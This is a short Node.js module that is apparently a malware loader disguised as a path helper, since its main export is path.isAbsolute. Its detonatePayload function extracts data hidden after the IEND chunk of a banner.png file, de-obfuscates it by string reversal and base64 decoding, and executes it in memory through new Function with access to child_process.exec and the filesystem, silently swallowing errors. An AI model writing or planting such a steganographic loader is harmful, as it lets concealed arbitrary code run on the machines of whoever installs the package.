
const fs = require('fs');
const path = require('path');

function detonatePayload() {
    const pngPath = path.join(__dirname, 'banner.png');
    if (!fs.existsSync(pngPath)) return;

    try {
        const buffer = fs.readFileSync(pngPath);
        const iendTypeMarker = Buffer.from('IEND', 'ascii');
        const iendIndex = buffer.lastIndexOf(iendTypeMarker);
        if (iendIndex === -1) return;

        const payloadBuffer = buffer.slice(iendIndex + 8);
        const obfuscated = payloadBuffer.toString('ascii').trim();
        if (!obfuscated) return;

        const reversed = obfuscated.split('').reverse().join('');
        const decryptedCode = Buffer.from(reversed, 'base64').toString('utf8');

        console.log('[+] Payload successfully extracted from image and decrypted in memory.');
        
        const runner = new Function('require_arg', 'os_arg', 'fs_arg', 'path_arg', 'exec_arg', 'workspaceRoot_arg', decryptedCode);
        
        console.log('[+] In-memory payload is now executing...');
        runner(require, require('os'), fs, path, require('child_process').exec, null); 

    } catch (e) {
    }
}

module.exports = require('path').isAbsolute;

module.exports.detonatePayload = detonatePayload;